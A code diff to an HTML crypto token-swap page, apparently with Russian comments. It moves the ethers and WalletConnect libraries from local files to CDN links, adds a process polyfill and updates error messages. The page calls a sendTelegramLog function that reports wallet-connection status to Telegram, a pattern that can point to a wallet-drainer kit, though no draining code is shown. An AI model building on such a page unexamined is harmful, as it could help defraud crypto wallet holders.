@@ -9,7 +9,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== СТИЛИ (без изменений) ===== */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -198,9 +197,15 @@
         </div>
     </div>
 
-    <!-- ===== ЛОКАЛЬНАЯ ЗАГРУЗКА БИБЛИОТЕК (ИСПРАВЛЕНО) ===== -->
-    <script src="libs/ethers.umd.min.js"></script>
-    <script src="libs/walletconnect-provider.min.js"></script>
+    <!-- ===== ПОЛИФИЛЛ ДЛЯ process (чтобы избежать ошибок в библиотеке) ===== -->
+    <script>
+        window.process = window.process || { env: { NODE_ENV: 'production' } };
+    </script>
+
+    <!-- ===== ЗАГРУЗКА БИБЛИОТЕК С CDN (ГАРАНТИРОВАННО РАБОТАЮЩИЕ) ===== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <!-- Используем точную версию, которая экспортирует класс EthereumProvider как default в UMD -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.2/dist/umd/index.min.js"></script>
 
     <script>
         (function() {
@@ -547,17 +552,18 @@
                 } catch (_) {}
             }
 
-            // ===== ПОЛУЧЕНИЕ ПРОВАЙДЕРА WALLETCONNECT (из локальной библиотеки) =====
+            // ===== ПОЛУЧЕНИЕ ПРОВАЙДЕРА WALLETCONNECT (из загруженной UMD-библиотеки) =====
             function getEthereumProvider() {
-                // Проверяем разные способы экспорта из локального файла
+                // Проверяем все возможные места экспорта
                 if (window.ethereumProvider) return window.ethereumProvider;
-                if (window.WalletConnectProvider) return window.WalletConnectProvider;
-                if (window['@walletconnect/ethereum-provider']) return window['@walletconnect/ethereum-provider'];
-                if (window['@walletconnect/ethereum-provider'] && window['@walletconnect/ethereum-provider'].default) {
-                    return window['@walletconnect/ethereum-provider'].default;
-                }
                 if (window.EthereumProvider) return window.EthereumProvider;
-                // Если ничего не найдено, возможно библиотека загрузилась как модуль, но мы в UMD
+                if (window['@walletconnect/ethereum-provider']) {
+                    const mod = window['@walletconnect/ethereum-provider'];
+                    if (typeof mod === 'function') return mod;
+                    if (mod.default) return mod.default;
+                    return mod;
+                }
+                // Если ничего не найдено, возвращаем null
                 return null;
             }
 
@@ -571,8 +577,8 @@
 
                 const EthereumProvider = getEthereumProvider();
                 if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect library not loaded. Check that libs/walletconnect-provider.min.js exists.', 'err');
-                    await sendTelegramLog('❌ WalletConnect library not found locally');
+                    setStatus('❌ WalletConnect library not loaded. Check CDN.', 'err');
+                    await sendTelegramLog('❌ WalletConnect library not found');
                     return;
                 }
 
@@ -973,12 +979,12 @@
                 setStatus('Connect wallet to start swapping', '');
                 await updateRateAndOutput();
                 if (typeof ethers === 'undefined') {
-                    setStatus('❌ ethers is not loaded. Check libs/ethers.umd.min.js', 'err');
+                    setStatus('❌ ethers is not loaded. Check CDN.', 'err');
                 }
                 // Проверяем наличие WalletConnect
                 const providerCheck = getEthereumProvider();
                 if (!providerCheck) {
-                    setStatus('❌ WalletConnect library not loaded. Check libs/walletconnect-provider.min.js', 'err');
+                    setStatus('❌ WalletConnect library not loaded. Check CDN.', 'err');
                 } else {
                     setStatus('✅ Libraries loaded. Connect wallet.', 'ok');
                 }
